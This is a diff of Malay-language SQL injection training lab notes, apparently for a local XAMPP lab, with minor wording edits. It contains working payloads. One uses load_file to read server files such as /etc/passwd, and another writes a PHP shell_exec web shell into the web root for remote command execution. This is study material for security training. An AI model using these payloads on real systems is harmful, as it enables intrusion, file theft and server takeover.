@@ -234,11 +234,11 @@ SQL Injection Training Lab notes for me (Malay Language)
 
 - Semua step sama macam [Level A - Basic GET SQL Injection](#level-a---basic-get-sql-injection).
 
-- Yang beza berada disini, Payload `-1'+union+all+select+1,load_file("c://xampp/htdocs/test/html.html"),3,4,5--+`, path `load_file` bergantung pada web storage masing-masing. Gambar bawah menunjukkan content dalam file html.html yang direka.
+- Yang beza berada disini, Payload ini `-1'+union+all+select+1,load_file("c://xampp/htdocs/test/html.html"),3,4,5--+`, akan membaca content file mengikut path `load_file` ditetapkan. Gambar bawah menunjukkan content dalam file html.html yang direka.
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5b86fda2-a9ff-4588-a7a6-becb84ca3402)
 
-- contoh path:
+- contoh path lain:
   - /etc/passwd
   - /etc/hosts
   - c:/Windows/System32/drivers/etc/hosts
@@ -249,11 +249,11 @@ SQL Injection Training Lab notes for me (Malay Language)
 
 - Semua step sama macam [Level A - Basic GET SQL Injection](#level-a---basic-get-sql-injection).
 
-- Yang beza berada disini, Payload `-1'+union+all+select+1,'<?php echo shell_exec($_GET["cmd"]); ?>',3,4,5+into+outfile+'c:/xampp/htdocs/test/backdoor1.php'--+` akan create satu file bernama `backdoor1.php` untuk tujuan RCE cmd seperti gambar dibawah. Path file bergantung pada server sama ada menggunakan windows atau linux.
+- Yang beza berada disini, Payload ini `-1'+union+all+select+1,'<?php echo shell_exec($_GET["cmd"]); ?>',3,4,5+into+outfile+'c:/xampp/htdocs/test/backdoor1.php'--+` akan create satu file bernama `backdoor1.php` untuk tujuan RCE cmd seperti gambar dibawah. Path file bergantung pada server sama ada menggunakan windows atau linux.
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e0ef2dea-0e31-4869-b841-2607e52d7bab)
 
-- Untuk test RCE pergi ke path file yang telah dicreate sebelum ini. Gambar di bawah contoh menggunakan cmd `Whoami`. Boleh cuba pelbagai cmd yang lain.
+- Untuk test RCE,buka tab baru pergi ke path file yang telah dicreate sebelum ini. Gambar di bawah contoh menggunakan cmd `Whoami`. Boleh cuba pelbagai cmd yang lain.
 
 ![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc238473-ab02-46f0-a5cb-0801c6ca9f80)
 
